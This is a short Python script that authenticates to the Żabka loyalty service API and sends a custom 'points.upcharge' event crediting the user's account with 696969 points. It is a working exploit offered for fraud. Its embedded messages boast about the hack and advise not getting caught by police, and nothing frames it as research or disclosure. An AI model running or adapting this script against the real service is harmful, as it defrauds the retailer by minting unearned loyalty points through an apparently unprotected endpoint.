import requests

# Replace with your Żabka login credentials
email = "your_email@example.com"  # Your login email
password = "your_password"        # Your login password

# Authentication endpoint and API request URL (replace if different)
auth_url = "https://zabka-snrs.zabka.pl/v4/auth/login"
api_url = "https://zabka-snrs.zabka.pl/v4/events/custom"

# Function to log in and fetch the token
def get_token(email, password):
    try:
        # Payload containing login credentials
        payload = {
            "email": email,
            "password": password
        }

        # Send the POST request to authenticate
        response = requests.post(auth_url, json=payload)

        # Handle the response
        if response.ok:
            # Extract the token from the response
            token = response.json().get("access_token")  # Adjust field name if needed
            if token:
                print("Token fetched successfully!")
                return token
            else:
                print("Token not found in the response.")
                return None
        else:
            print(f"Failed to log in: {response.status_code} {response.text}")
            return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

# Function to send an API request using the token
def send_api_request(token, email):
    try:
        # Headers including the token
        headers = {
            "authorization": f"Bearer {token}",
            "api-version": "4.4",
            "Content-Type": "application/json"
        }

        # Payload for the API request
        payload = {
            "action": "points.upcharge",
            "label": "GG SzymoQwerty!!!!!",  # Replace with actual label
            "client": {"email": email},
            "params": {
                "displaySubheader": "You Did It!!!!!",  # Replace with actual subheader
                "description": "It was easy. Just don`t get caught by the cops.",    # Replace with actual description
                "displayHeader": "GG",       # Replace with actual header
                "points": "696969"                       # Replace with the desired points value
            }
        }

        # Send the POST request
        response = requests.post(api_url, json=payload, headers=headers)

        # Handle the response
        if response.ok:
            print("API request successful:", response.json())
        else:
            print("API request failed:", response.status_code, response.text)
    except Exception as e:
        print(f"An error occurred: {e}")

# Main script
if __name__ == "__main__":
    # Step 1: Fetch the token
    token = get_token(email, password)

    # Step 2: Use the token to make an API request
    if token:
        send_api_request(token, email)
    else:
        print("Could not fetch the token. Exiting.")
